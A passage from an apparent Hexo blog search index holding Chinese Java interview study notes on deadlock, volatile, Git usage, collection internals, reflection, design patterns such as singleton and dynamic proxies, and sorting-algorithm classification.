死锁死锁是指两个或两个以上的进程在执行过程中，因争夺资源而造成的一种互相等待的现象， 若无外力作用，它们都将无法推进下去。这是一个严重的问题，因为死锁会让你的程序挂起 无法完成任务。 死锁的发生必须满足以下四个条件： 互斥条件：一个资源每次只能被一个进程使用。 请求与保持条件：一个进程因请求资源而阻塞时，对已获得的资源保持不放。 不剥夺条件：进程已获得的资源，在末使用完之前，不能强行剥夺。 循环等待条件：若干进程之间形成一种头尾相接的循环等待资源关系。 避免死锁最简单的方法就是阻止循环等待条件，将系统中所有的资源设置标志位、排序，规 定所有的进程申请资源必须以一定的顺序（升序或降序）做操作来避免死锁 2.6 Volatile 特殊域变量多线程编程，我们要解决的问题集中在三个方面： 原子性。最简单的例子就是，i++,在多线程环境下，最终的结果是不确定的，为什么？就 是因为这么一个++操作，被编译为计算机底层指令后，是多个指令来完成的。那么遇到并发 的情况，就会导致彼此“覆盖”的情况。 可见性。通俗解释就是，在 A 线程对一个变量做了修改，在 B 线程中，能正确的读取到 修改后的结果。究其原理，是 cpu 不是直接和系统内存通信，而是把变量读取到 L1，L2 等 内部的缓存中，也叫作私有的数据工作栈。修改也是在内部缓存中，但是何时同步到系统内 存是不能确定的，有了这个时间差，在并发的时候，就可能会导致，读到的值，不是最新值。 指令重排。这里只说指令重排序，虚拟机在把代码编译为指令后执行，出于优化的目的， 在保证结果不变的情况下，可能会调整指令的执行顺序。 valotile，能满足上述的可见性和有序性。但是无法保证原子性。 可见性，是在修改后，强制把对变量的修改同步到系统内存。而其他 cpu 在读取自己的内部 缓存中的值的时候，发现是 valotile 修饰的，会把内部缓存中的值，置为无效，然后从系统 内存读取。 有序性，是通过内存屏障来实现的。所谓的内存屏障，可以理解为，在某些指令中，插入屏 障指令，用以确保，在向屏障指令后面继续执行的时候，其前面的所有指令已经执行完毕。 3. Java多线程中常见的面试题1. sleep(),wait(),join(),yield()四个方法的区别总结： 1）：sleep()，Thread 类中的方法，表示当前线程进入阻塞状态，不释放锁 2）：wait()，Object 类中的方法，表示线程进入等待状态，释放锁，所以一般能调用这个方 法的都是同步代码块，或者获取了锁的线程代码，通常和 notify()和 notifyAll()方法结合使用 3）：join()，Thread 类中的方法，假如在 a 线程中调用 b 线程对象的 join()方法，表示当前 a 线程阻塞，直到 b 线程运行结束 4）：yield()，Thread 类中的方法，表示线程回可执行状态。跟 sleep 方法一样，也不交出锁， 只不过不带时间参数，是指交出 cpu 2. Thread 和 Runnable 的区别总结： 实现 Runnable 接口比继承 Thread 类所具有的优势： 1）：适合多个相同的程序代码的线程去处理同一个资源 2）：可以避免 java 中的单继承的限制 3）：增加程序的健壮性，代码可以被多个线程共享，代码和数据独立 4）：线程池只能放入实现 Runable 或 callable 类线程，不能直接放入继承 Thread 的类 …]]></content>
      <categories>
        <category>Java</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git]]></title>
    <url>%2F2018%2F05%2F29%2FJava%2FInterview%2FInterview-Notebook%2FGit%2F</url>
    <content type="text"><![CDATA[学习资料 集中式与分布式 Git 的中心服务器 Git 工作流 分支实现 冲突 Fast forward 分支管理策略 储藏（Stashing） SSH 传输设置 .gitignore 文件 Git 命令一览 学习资料 Git - 简明指南 图解 Git 廖雪峰 : Git 教程 Learn Git Branching 集中式与分布式Git 属于分布式版本控制系统，而 SVN 属于集中式。 集中式版本控制只有中心服务器拥有一份代码，而分布式版本控制每个人的电脑上就有一份完整的代码。 集中式版本控制有安全性问题，当中心服务器挂了所有人都没办法工作了。 集中式版本控制需要连网才能工作，如果网速过慢，那么提交一个文件的会慢的无法让人忍受。而分布式版本控制不需要连网就能工作。 分布式版本控制新建分支、合并分支操作速度非常快，而集中式版本控制新建一个分支相当于复制一份完整代码。 Git 的中心服务器Git 的中心服务器用来交换每个用户的修改。没有中心服务器也能工作，但是中心服务器能够 24 小时保持开机状态，这样就能更方便的交换修改。Github 就是一种 Git 中心服务器。 Git 工作流 新建一个仓库之后，当前目录就成为了工作区，工作区下有一个隐藏目录 .git，它属于 Git 的版本库。 Git 版本库有一个称为 stage 的暂存区，还有自动创建的 master 分支以及指向分支的 HEAD 指针。 git add files 把文件的修改添加到暂存区 git commit 把暂存区的修改提交到当前分支，提交之后暂存区就被清空了 git reset – files 使用当前分支上的修改覆盖暂缓区，用来撤销最后一次 git add files git checkout – files 使用暂存区的修改覆盖工作目录，用来撤销本地修改 可以跳过暂存区域直接从分支中取出修改或者直接提交修改到分支中 git commit -a 直接把所有文件的修改添加到暂缓区然后执行提交 git checkout HEAD – files 取出最后一次修改，可以用来进行回滚操作 分支实现Git 把每次提交都连成一条时间线。分支使用指针来实现，例如 master 分支指针指向时间线的最后一个节点，也就是最后一次提交。HEAD 指针指向的是当前分支。 新建分支是新建一个指针指向时间线的最后一个节点，并让 HEAD 指针指向新分支表示新分支成为当前分支。 每次提交只会让当前分支向前移动，而其它分支不会移动。 合并分支也只需要改变指针即可。 冲突当两个分支都对同一个文件的同一行进行了修改，在分支合并时就会产生冲突。 Git 会使用 &lt;&lt;&lt;&lt;&lt;&lt;&lt; ，======= ，&gt;&gt;&gt;&gt;&gt;&gt;&gt; 标记出不同分支的内容，只需要把不同分支中冲突部分修改成一样就能解决冲突。 12345&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEADCreating a new branch is quick &amp; simple.=======Creating a new branch is quick AND simple.&gt;&gt;&gt;&gt;&gt;&gt;&gt; feature1 Fast forward“快进式合并”（fast-farward merge），会直接将 master 分支指向合并的分支，这种模式下进行分支合并会丢失分支信息，也就不能在分支历史上看出分支信息。 可以在合并时加上 –no-ff 参数来禁用 Fast forward 模式，并且加上 -m 参数让合并时产生一个新的 commit。 1$ git merge --no-ff -m &quot;merge with no-ff&quot; dev 分支管理策略master 分支应该是非常稳定的，只用来发布新版本； 日常开发在开发分支 dev 上进行。 储藏（Stashing）在一个分支上操作之后，如果还没有将修改提交到分支上，此时进行切换分支，那么另一个分支上也能看到新的修改。这是因为所有分支都共用一个工作区的缘故。 可以使用 git stash 将当前分支的修改储藏起来，此时当前工作区的所有修改都会被存到栈上，也就是说当前工作区是干净的，没有任何未提交的修改。此时就可以安全的切换到其它分支上了。 123$ git stashSaved working directory and index state \ &quot;WIP on master: 049d078 added the index file&quot;HEAD is now at 049d078 added the index file (To restore them type &quot;git stash apply&quot;) 该功能可以用于 bug 分支的实现。如果当前正在 dev 分支上进行开发，但是此时 master 上有个 bug 需要修复，但是 dev 分支上的开发还未完成，不想立即提交。在新建 bug 分支并切换到 bug 分支之前就需要使用 git stash 将 dev 分支的未提交修改储藏起来。 SSH 传输设置Git 仓库和 Github 中心仓库之间的传输是通过 SSH 加密。 如果工作区下没有 .ssh 目录，或者该目录下没有 id_rsa 和 id_rsa.pub 这两个文件，可以通过以下命令来创建 SSH Key： 1$ ssh-keygen -t rsa -C &quot;youremail@example.com&quot; 然后把公钥 id_rsa.pub 的内容复制到 Github “Account settings” 的 SSH Keys 中。 .gitignore 文件忽略以下文件： 操作系统自动生成的文件，比如缩略图； 编译生成的中间文件，比如 Java 编译产生的 .class 文件； 自己的敏感信息，比如存放口令的配置文件。 不需要全部自己编写，可以到 https://github.com/github/gitignore 中进行查询。 Git 命令一览 比较详细的地址：http://www.cheat-sheets.org/saved-copy/git-cheat-sheet.pdf]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java基础增强-1 集合反射设计模式排序]]></title>
    <url>%2F2018%2F05%2F29%2FJava%2FMyStudy%2FJava%E5%9F%BA%E7%A1%80%E5%A2%9E%E5%BC%BA-1%2F</url>
    <content type="text"><![CDATA[1、集合框架1.1 、集合框架体系图 Java 的集合框架主要分为五大类体系：1、Collection（常用的 List 和 Set，和不常用的 Queue 和 Vector 和 Stack），单元素集合2、Map（常用的 HashMap 和 TreeMap，不常用的 HashTable），Key-Value 映射3、Iterator（迭代器）4、工具类（Collections 和 Arrays）5、Comparable 和 Comparator 比较器 Java 中的集合和数组的区别:1、数组长度在初始化时指定，意味着只能保存定长的数据。而集合可以保存数量不确定的 数据。同时可以保存具有映射关系的数据（即关联数组，键值对 key-value）。 2、数组元素即可以是基本类型的值，也可以是对象。集合里只能保存对象（实际上只是保存对象的引用变量），基本数据类型的变量要转换成对应的包装类才能放入集合类中。 Collection 接口中的方法： Map 接口中的方法： 1.2、常用集合特性概述1.2.1 List 系 List 特点：元素有放入顺序，元素可重复 List 接口有三个实现类：LinkedList，ArrayList，Vector LinkedList：底层基于链表实现，链表内存是散乱的，每一个元素存储本身内存地址的同时还 存储下一个元素的地址。链表增删快，查找慢 ArrayList 和 Vector 底层都是基于数组实现的，查询快，增删慢，区别是 ArrayList 是非线程安全的，效率高；Vector 是基于线程安全的，效率低 ArrayList 的初始化大小是 10，扩容策略是 1.5 倍原元素数量的大小 数组 初始容量+扩容 (jdk10)12345678910111213141516171819// 初始容量private static final int DEFAULT_CAPACITY = 10;// 扩容private int newCapacity(int minCapacity) &#123; // overflow-conscious code int oldCapacity = elementData.length; int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1); if (newCapacity - minCapacity &lt;= 0) &#123; if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) return Math.max(DEFAULT_CAPACITY, minCapacity); if (minCapacity &lt; 0) // overflow throw new OutOfMemoryError(); return minCapacity; &#125; return (newCapacity - MAX_ARRAY_SIZE &lt;= 0) ? newCapacity : hugeCapacity(minCapacity); &#125; 选择标准： 如果涉及到“动态数组”、“栈”、“队列”、“链表”等结构，应该考虑用 List，具体的选择哪 个 List，根据下面的标准来取舍。 1、对于需要快速插入，删除元素，应该使用 LinkedList。（增删改） 2、对于需要快速随机访问元素，应该使用 ArrayList。（查询） 3、对于“单线程环境”或者“多线程环境，但 List 仅仅只会被单个线程操作”，此时应该使 用非同步的类(如 ArrayList)。对于“多线程环境，且 List 可能同时被多个线程操作”，此时， 应该使用同步的类(如 Vector)。 LinkedList add(E e)1234567891011121314151617# add(E e) 源码public boolean add(E e) &#123; linkLast(e); return true;&#125; void linkLast(E e) &#123; final Node&lt;E&gt; l = last; final Node&lt;E&gt; newNode = new Node&lt;&gt;(l, e, null); last = newNode; if (l == null) first = newNode; else l.next = newNode; size++; modCount++;&#125; 1.2.2、Set 系 Set 特点：元素放入无顺序，元素不可重复 Set 接口的实现类：HashSet，TreeSet，LinkedHashSet HashSet（底层由 HashMap 实现）底层通过 hashCode()和 equals()进行去重。 HashSet 内部判断相等的标准HashSet 判断两个元素相等的标准： ​ 两个对象通过 equals()方法比较相等，并且两个对象的 hashCode()方法返回值也相等 HashSet 中判断集合元素相等，两个对象比较具体分为如下四个情况： 如果有两个元素通过 equal()方法比较返回 false，并且它们的 hashCode()方法返回不相等， HashSet 将会把它们存储在不同的位置。 如果有两个元素通过 equal()方法比较返回 true，并且它们的 hashCode()方法返回不相等， HashSet 将会把它们存储在不同的位置。 如果两个对象通过 equals()方法比较不相等，hashCode()方法比较相等，HashSet 将会把它们存储在相同的位置，在这个位置以链表式结构来保存多个对象。这是因为当向 HashSet 集合中存入一个元素时，HashSet 会调用对象的 hashCode()方法来得到对象的 hashCode 值， 然后根据该 hashCode 值来决定该对象存储在 HashSet 中存储位置。 如果有两个元素通过 equal()方法比较返回 true，并且它们的 hashCode()方法返回 true，HashSet 将不予添加。 LinkedHashSet，是 HashSet 的子类，在插入元素的时候，同时使用链表维持插入元素的顺序 SortedSet 接口有一个实现类：TreeSet（底层由平衡二叉树实现）确保集合中的元素都是出于排序状态 注意 LinkedHashSet 和 SortedSet 区别，前者存插入顺序，后者存插入之后的顺序 另外: JDK5 : 桶表 + 链表 JDK8 : 桶表 + 链表 + 二叉树 - **二叉树**: 检索深度 &gt; 8 的时候, 转化为二叉树, 减少查询深度 HashSet — HashMap 的源码实现123456789101112131415161718192021222324252627282930313233343536373839/** * The default initial capacity - MUST be a power of two. * 桶表默认容量 16 * 控制hashcode 不超16范围, a.hashcode = xx % 16 (hashcode 取模 桶个数) */static final int DEFAULT_INITIAL_CAPACITY = 1 &lt;&lt; 4; // aka 16/** * MUST be a power of two &lt;= 1&lt;&lt;30. * 桶表最大 2^30 */static final int MAXIMUM_CAPACITY = 1 &lt;&lt; 30;/** * 扩容因子: 0.75 * 扩容: 每次2倍 */static final float DEFAULT_LOAD_FACTOR = 0.75f;/** * 链表: hash算法值相同的时候, 会把值相同的放在一个链表上, 链表上的元素个数 * 超过8个时, 转化为二叉树, 提升查询效率 */static final int TREEIFY_THRESHOLD = 8;/** * The bin count threshold for untreeifying a (split) bin during a * resize operation. Should be less than TREEIFY_THRESHOLD, and at * most 6 to mesh with shrinkage detection under removal. */static final int UNTREEIFY_THRESHOLD = 6;/** * The smallest table capacity for which bins may be treeified. * (Otherwise the table is resized if too many nodes in a bin.) * Should be at least 4 * TREEIFY_THRESHOLD to avoid conflicts * between resizing and treeification thresholds. */static final int MIN_TREEIFY_CAPACITY = 64; TreeSet的默认排序 TreeSet是有序的不可重复的, 有序是指元素值的大小 数值类型: 按照大小进行升序排序 字符串类型: 按照字典顺序进行升序排序 字符串从左到右, 一位一位的比较 自定义TreeSet类型: 实现 compareTo方法, 返回为0的情况会默认覆盖 1.2.2、Map 系Map 特点：存储的元素是键值对，在 JDK1.8 版本中是 Node，在老版本中是 Entry Map 接 口 有 五 个 常用 实 现 类 ： HashMap ， HashTable ， LinkeHashMap ， TreeMap ， ConcurrentHashMap 1. HashMap &amp; Hashtable 的区别HashMap 1. 非线程安全, 效率高 2. key不可以重复 3. key可以为null, 但只能有一个key为null Hashtable 线程安全, 效率低 key不可以重复 不可以为null 2. concurrentHash 简单分析是从 JDK1.5 之后提供的一个 HashTable 的替代实现，采 一个 map 中的元素分成很多的 segment，通过 lock 机制可以对每个 segment 加读写锁，从 而提高 map 的效率，底层实现采用数组+链表+红黑树的存储结构 Java并发包中的, 既是线程安全的, 又不至于效率过低 怎么实现: 分段锁机制 分段锁: 只加载在某一段数据上 MySql: 查询 - 95%, 增删改 - 5% 读锁: 共享锁, 一个线程进行操作的时候不应吸纳另一个线程的结构 写锁: 排它锁, 一个线程在进行操作的时候不允许其他任何线程的操作 3. put &amp; get 的流程put 的大致流程如下： 通过 hashcode 方法计算出 key 的 hash 值 通过 hash%length 计算出存储在 table 中的 index（源码中是使用 hash&amp;(length-1)，这样结 果相同，但是更快） 如果此时 table[index]的值为空，那么就直接存储，如果不为空那么就链接到这个数所在 的链表的头部。（在 JDK1.8 中，如果链表长度大于 8 就转化成红黑树） get 的大致流程如下： 通过 hashcode 计算出 key 的 hash 值 通过 hash%length 计算出存储在 table 中的 index（源码中是使用 hash&amp;(length-1)，这样结 果相同，但是更快） 遍历 table[index]所在的链表，只有当 key 与该节点中的 key 的值相同时才取出。 1.3 掌握重点List: ArrayList, LinkList Set: HashSet, TreeSet 需要掌握的方法: add , get, contains Map: HashMap, TreeMap 需要掌握的方法: put get map的循环遍历 containsKey…. 以上的都需要跟下源码 1.4 功能方法1.4.1 List 的功能方法ArrayList: 由数组实现的 List。允许对元素进行快速随机访问，但是向 List 中间插入与移 除元素的速度很慢。ListIterator 只应该用来由后向前遍历 ArrayList，而不是用来插入和移除 元素。因为那比 LinkedList 开销要大很多。 LinkedList : 对顺序访问进行了优化，向 List 中间插入与删除的开销并不大。随机访问则 相对较慢。(使用 ArrayList 代替。)还具有下列方 法：addFirst(), addLast(), getFirst(), getLast(), removeFirst() 和 removeLast(), 这些方法 (没有在任何接口或基类中定义过)使得 LinkedList 可以当作堆栈、队列和双向队列使用。 1.4.2 Set的功能方法Set : 存入 Set 的每个元素都必须是唯一的，因为 Set 不保存重复元素。加入 Set 的元素 必须定义 equals()方法以确保对象的唯一性。Set 与 Collection 有完全一样的接口。Set 接口 不保证维护元素的次序。 HashSet : 为快速查找设计的 Set。存入 HashSet 的对象必须定义 hashCode()。 TreeSet : 保存次序的 Set，底层为树结构。使用它可以从 Set 中提取有序的序列。 LinkedHashSet : 具有 HashSet 的查询速度，且内部使用链表维护元素的顺序(插入的次 序 。于是在使用迭代器遍历 Set 时，结果会按元素插入的次序显示。 1.4.3 Map 的功能方法Map : 维护“键值对”的关联性，使你可以通过“键”查找“值” HashMap : Map 基于散列表的实现。插入和查询“键值对”的开销是固定的。可以通过 构造器设置容量 capacity 和负载因子 load factor，以调整容器的性能。 LinkedHashMap : 类似于 HashMap，但是迭代遍历它时，取得“键值对”的顺序是其插 入次序，或者是最近最少使用(LRU)的次序。只比 HashMap 慢一点。而在迭代访问时发而更 快，因为它使用链表维护内部次序。 TreeMap : 基于红黑树数据结构的实现。查看“键”或“键值对”时，它们会被排序(次 序由 Comparabel 或 Comparator 决定)。TreeMap 的特点在 于，你得到的结果是经过排序的。 TreeMap 是唯一的带有 subMap()方法的 Map，它可以返回一个子树。 WeakHashMap : 弱键(weak key)Map，Map 中使用的对象也被允许释放: 这是为解决特 殊问题设计的。如果没有 map 之外的引用指向某个“键”，则此“键”可以被垃圾收集器回 收。 IdentifyHashMap : 使用==代替 equals()对“键”作比较的 hash map。专为解决特殊问题 而设计。 2、反射2.1 反射反射: 将 Java 类中的各个成分 (属性, 方法, 构造方法) 映射成对应的类 在运行时判断任意一个对象的所属的类 Class。 在运行时判断构造任意一个类的对象 Constructor。 在运行时判断任意一个类所具有的成员变量 Field 和方法 Method。 在运行时调用任意一个对象的方法。method.invoke(object, args) 反射的好处 提高了整个代码的灵活性 不需要知道细节 反射用的最多的时候, 就是写框架的时候 反射中需要掌握3个类: Constructor: 构造器的描述类 Field: 属性的描述类 Method: 方法的描述类 Java 预定义类型 是否是预定义类型: isPromitive(), 8种基本数据类型 + void 都是预定义类型 引用类型, 包装类不是预定义类型. 12System.out.println(int.class.isPrimitive()); // trueSystem.out.println(Integer.class.isPrimitive()); // false 2.2 ClassClass : 用于描述所有类的类, Class 类描述了类的属性信息，如类名、访问权限、包名、字 段名称列表、方法名称列表等, Class就是反射的基础. 获取Class的3种方式 1. `Class.forName`(&quot;类名字符串&quot;) (注意：类名字符串必须是全称，包名+类名) - 如果 `.class`已经被加载到内存了, 直接返回 - 如果没有的话, 就先加载到内存 2. `类名.class` 3. `实例对象.getClass()` 2.3 Constructor1234567891011121314151617181920212223242526// API// 补充: 可变参数 Class&lt;?&gt;... parameterTypespublic Constructor&lt;T&gt; getConstructor(Class&lt;?&gt;... parameterTypes) &#123;&#125;public Constructor&lt;?&gt;[] getConstructors() throws SecurityException &#123;&#125; ================//使用=============================////////获取构造方法//////////// 获取某个类的所有构造方法：Constructor[] constructor = Class.forName("java.lang.String").getConstructors();// 获取某个特殊（特定参数）的构造方法：Constructor constructor = Class.forName("java.lang.String").getConstructor(StringBuffer.class);////////创建实例对象//////////// 通常方式，直接调用构造方法：String str = new String("huangbo");// 反射方式：调用实参构造String str = (String)constructor.newInstance(new StringBuffer("huangbo"));// 反射方式：调用空参构造String obj = (String)Class.forName("java.lanng.String").newInstance();只有两个类拥有 newInstance()方法，分别是 Class 类和 Constructor 类 Class 类中的 newInstance() 方法是不带参数的，Constructor 类中的 newInstance()方法是带参数的(Object)，需要提供 必要的参数 2.4 FieldField类代表某个类中的一个成员变量，设有一个 obj 对象，Field 对象不是 obj 具体的变量值， 而是指代的是 obj 所属类的哪一个变量，可以通过 Field(对象).get(obj)获取相应的变量值 123456789101112131415// APIpublic Field[] getFields() throws SecurityException &#123;&#125;public Field getField(String name) &#123;&#125;================//使用=============================// getField 方法只能获取声明为 public 的变量，对于私有变量，可以通过 getDeclaredField()方法获 取 private 变量Field field = obj.getClass().getDeclaredField();// 将 private 变量设置为可访问；继承自父类AccessibleObject 的方法才可获取变量值field.setAccessible(true); // 获得对象值, 传入对象field.get(obj); // 反射替换,设置对象值// 传入对象,值// 把 obj 对象的 field 属性的值替换为 newValuefield.set(obj,newValue) 2.5 MethodMethod 类代表某个类中的成员方法 Method 对象不是具体的方法，而是来代表类中哪一个方法，与对象无关 123456789101112// 获取: 得到类中某一个方法：Method methodCharAt = Class.forName("java.lang.String").getMethod("charAt",int.class)// getMethod 方法用于得到一个方法对象，该方法接受的参数首先要有该方法名（String 类型），// 然后通过参数列表来区分重载那个方法，参数类型用 Class 对象来表示(如为 int 就用 int.class) // 调用方法：//普通方式：str.charAt(1)//反射方式：methodCharAt.invoke(str,1)// 以上两种调用方式等价 3. 设计模式设计模式（Design pattern）代表了面向对象编程中最佳的实践，通常被有经验的面向对象的 软件开发人员所采用。设计模式是软件开发人员在软件开发过程中面临的一般问题的解决方 案。这些解决方案是众多软件开发人员经过相当长的一段时间的试验和错误总结出来的。 设计模式只不过针对某些具体场景提供了一些效率较高的以复杂度换灵活性的手段而已 推荐学习站点 3.1 设计模式 – 六大原则总原则：开闭原则（Open Close Principle） 开闭原则就是说对扩展开放，对修改关闭。在程序需要进行拓展的时候，不能去修改原有的 代码，而是要扩展原有代码，实现一个热插拔的效果。所以一句话概括就是：为了使程序的 扩展性好，易于维护和升级。想要达到这样的效果，我们需要使用接口和抽象类等，后面的 具体设计中我们会提到这点。 六大原则： 单一职责原则 不要存在多于一个导致类变更的原因，也就是说每个类应该实现单一的职责，如若不然，就 应该把类拆分。 里氏替换原则（Liskov Substitution Principle） 里氏替换原则中，子类对父类的方法尽量不要重写和重载。因为父类代表了定义好的结构，通过这个规范的接口与外界交互，子类不应该随便破坏它。 依赖倒转原则（Dependence Inversion Principle） 这个是开闭原则的基础，具体内容：面向接口编程，依赖于抽象而不依赖于具体。写代码 时用到具体类时，不与具体类交互，而与具体类的上层接口交互。 接口隔离原则（Interface Segregation Principle） 这个原则的意思是：每个接口中不存在子类用不到却必须实现的方法，如果不然，就要将 接口拆分。使用多个隔离的接口，比使用单个接口（多个接口方法集合到一个的接口）要好。 迪米特法则（最少知道原则）（Demeter Principle） 就是说：一个类对自己依赖的类知道的越少越好 。也就是说无论被依赖的类多么复杂，都 应该将逻辑封装在方法的内部，通过 public 方法提供给外部。这样当被依赖的类变化时，才 能最小的影响该类。 合成复用原则（Composite Reuse Principle） 原则是尽量首先使用合成/聚合的方式，而不是使用继承。 3.2 设计模式 – 分类总体来说设计模式分为三大类： 创建型模式，共五种：工厂方法模式、抽象工厂模式、单例模式、建造者模式、原型模式。 结构型模式，共七种：适配器模式、装饰器模式、代理模式、外观模式、桥接模式、组合 模式、享元模式。 行为型模式，共十一种：策略模式、模板方法模式、观察者模式、迭代子模式、责任链模 式、命令模式、备忘录模式、状态模式、访问者模式、中介者模式、解释器模式。 3.3 常见设计模式3.3.1 单例模式(手写)单例模式（Singleton Pattern）是 Java 中最简单的,也是最最最常用的设计模式之一。这种类 型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。 注意: 单例类只能有一个实例。 单例类必须自己创建自己的唯一实例。 单例类必须给所有其他对象提供这一实例。 共有六种实现： 1、懒汉式，线程不安全 1234567891011public class Singleton &#123; private static Singleton instance; private Singleton ()&#123;&#125; public static Singleton getInstance() &#123; if (instance == null) &#123; instance = new Singleton(); &#125; return instance; &#125; &#125; 2、懒汉式，线程安全 12345678910public class Singleton &#123; private static Singleton instance; private Singleton ()&#123;&#125; public static synchronized Singleton getInstance() &#123; if (instance == null) &#123; instance = new Singleton(); &#125; return instance; &#125; &#125; 3、饿汉式 1234567public class Singleton &#123; private static Singleton instance = new Singleton(); private Singleton ()&#123;&#125; public static Singleton getInstance() &#123; return instance; &#125; &#125; 4、双检锁/双重校验锁（DCL，即 double-checked locking） –面试必备 1234567891011121314public class Singleton &#123; private volatile static Singleton singleton; private Singleton ()&#123;&#125; public static Singleton getSingleton() &#123; if (singleton == null) &#123; synchronized (Singleton.class) &#123; if (singleton == null) &#123; singleton = new Singleton(); &#125; &#125; &#125; return singleton; &#125; &#125; 5、登记式/静态内部类 123456789public class Singleton &#123; private static class SingletonHolder &#123; private static final Singleton INSTANCE = new Singleton(); &#125; private Singleton ()&#123;&#125; public static final Singleton getInstance() &#123; return SingletonHolder.INSTANCE; &#125; &#125; 6、枚举 12345public enum Singleton &#123; INSTANCE; public void whateverMethod() &#123; &#125; &#125; 详细请看 3.3.2 装饰器模式(手写)首先看一段代码 代码分析: 构造一个缓冲的字符输入流。包装了一个文件字符输入流。 事实上，BufferedReader 就是用来增强 FileReader 的读取的功能的。 FileReader 只有 read()方法， 但是 BufferedReader 中却增加了一个 readLine()的逐行读取 的功能 所以这就相当于是 BufferedReader 装饰了 FileReader，让 FileReader 变得更强大 装饰器模式概念 装饰器模式（Decorator Pattern）允许向一个现有的对象添加新的功能，同时又不改变其结 构。这种类型的设计模式属于结构型模式，它是作为现有的类的一个包装。 这种模式创建了一个装饰类，用来包装原有的类，并在保持类方法签名完整性的前提下， 提供了额外的功能。 装饰器模式实现方式1. 定义包装类 2. 将要装饰的模式作为参数传入包装类 3. 实现要加强的方法 3.3.2 代理模式1. 静态代理静态代理的缺点很明显：一个代理类只能对一个业务接口的实现类进行包装，如果有多个业 务接口的话就要定义很多实现类和代理类才行。 … 2. 动态代理第一种：JDK 动态代理实现 JDK 动态代理所用到的代理类在程序调用到代理类对象时才由 JVM 真正创建，JVM 根据传 进来的业务实现类对象以及方法名，动态地创建了一个代理类的 class 文件并被字节码引擎 执行，然后通过该代理类对象进行方法调用。我们需要做的，只需指定代理类的预处理、 调用后操作即可。 只能对实现了接口的类生成代理，而不是针对类，该目标类型实现的接口都将被代理。原理 是通过在运行期间创建一个接口的实现类来完成对目标对象的代理。具体实现步骤： 定义一个实现接口 InvocationHandler 的类 通过构造函数或者静态工厂方法等，注入被代理类 实现 invoke(Object proxy, Method method, Object[] args)方法 在主函数中获得被代理类的类加载器 使用 Proxy.newProxyInstance(classLoader, interfaces, args)产生一个代理对象 通过代理对象调用各种方法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859=============//实现InvocationHandler====================import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;/** * @author shixuanji * 动态代理: JDK * 1. 实现一个接口 InvocationHandler * 2. 将代理对象作为属性传入 代理所有的类 * 3. 重写 invoke()方法 * */public class ProxyDynamicStudentDao implements InvocationHandler &#123; private Object o; public ProxyDynamicStudentDao(Object o) &#123; this.o = o; &#125; /* * @param proxy: 代理对象, 基本不用 ???应该是代理对象把, 老师写的被代理对象 * @param method: 拦截下来的被代理对象的方法 - 反射中描述方法的类 * @param args: 被代理对象业务方法的参数 */ public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; String methodName = method.getName().toString(); if (methodName.equals("insert")) &#123; // xxx &#125; else &#123; //ssssss &#125; // 做的事情就是对代理方法的方法的增强 // 增强 System.out.println("开始执行"); // 业务方法调用, 一定要调用被代理对象的 // obj: 对象 // args:方法的参数 Object res = method.invoke(o, args); // 增强 System.out.println("执行完了"); return res; &#125;&#125;============== // 使用========================/*** 参数1: 被代理对象的类加载器 * 参数2: 要实现的接口* 参数3: 代理类对象 * * 能.出来什么看 左边接收着* 运行时看 真正创建的对象*/// 目前看来 代理实例只能是接口BaseDAO newProxyInstance = (BaseDAO)Proxy.newProxyInstance(StudentDAO.class.getClassLoader(), StudentDAO.class.getInterfaces(), new ProxyDynamicStudentDao(new StudentDAO()));newProxyInstance.insert(new Teacher()); 第二种：CGLIB 动态代理实现： CGLIB 是针对类来实现代理的，原理是对指定的业务类生成一个子类，并覆盖其中业务方法 实现代理。因为采用的是继承，所以不能对 final 修饰的类进行代理，final 的方法也不能 针对类实现代理，对是否实现接口无要求。原理是对指定的类生成一个子类，覆盖其中的方 法，因为是继承，所以被代理的类或方法最好不要声明为 final 类型。具体实现步骤： 1、定义一个实现了 MethodInterceptor 接口的类 2、实现其 intercept()方法，在其中调用 proxy.invokeSuper() 3. 静态代理和动态代理的区别静态代理：自己编写创建代理类，然后再进行编译，在程序运行前，代理类的.class 文件就 已经存在了。 动态代理：在实现阶段不用关心代理谁，而在运行阶段（通过反射机制）才指定代理哪一个 对象。 3.4 重点掌握3.4.1. 装饰者模式 和 静态代理模式 区别在代码上的区别: 一般情况下, 装饰者模式被装饰的对象一般是从外部传入, 装饰的是一类的事务, 只要是某一类的(Class)都可以 静态代理模式被代理对象的初始化一般是内部创建的, 代理的是一个类的对象. 从功能上: 装饰者模式, 用于对被装饰者业务逻辑实现或增强, 对方法名没有要求 静态代理: 主要用于权限控制, 日志打印, 错误预警等功能 3.4.2. 三种设计模式必须掌握的 单例设计模式 装饰者模式 动态代理模式 3.4.3. 手写代码 冒泡排序 快速排序 设计模式 hadoop 的 wordcount scala 的 wordcount spark 的 wordcount 4. 排序算法 核心概念：算法复杂度、稳定性 算法复杂度：算法复杂度是指算法在编写成可执行程序后，运行时所需要的资源，资源包括 时间资源和内存资源。应用于数学和计算机导论。 稳定性：一个排序算法是稳定的，就是当有两个相等记录的关键字 R 和 S，且在原本的列表 中 R 出现在 S 之前，在排序过的列表中 R 也将会是在 S 之前。 4.1. 排序分类按照排序结果是否稳定性分类： 稳定排序：插入排序，冒泡排序，归并排序，计数排序，基数排序，桶排序（如果桶内 排序采用的是稳定性排序） 非稳定排序：选择排序，快速排序，堆排序。 按照排序过程中是否需要额外空间： 原地排序：插入排序，选择排序，冒泡排序，快速排序，堆排序。 非原地排序：归并排序，计数排序，基数排序，桶排序。 按照排序的主要操作分类： 交换类：冒泡排序、快速排序；此类的特点是通过不断的比较和交换进行排序； 插入类：简单插入排序、希尔排序；此类的特点是通过插入的手段进行排序； 选择类：简单选择排序、堆排序；此类的特点是看准了再移动； 归并类：归并排序；此类的特点是先分割后合并； 按照是否需要比较分类： 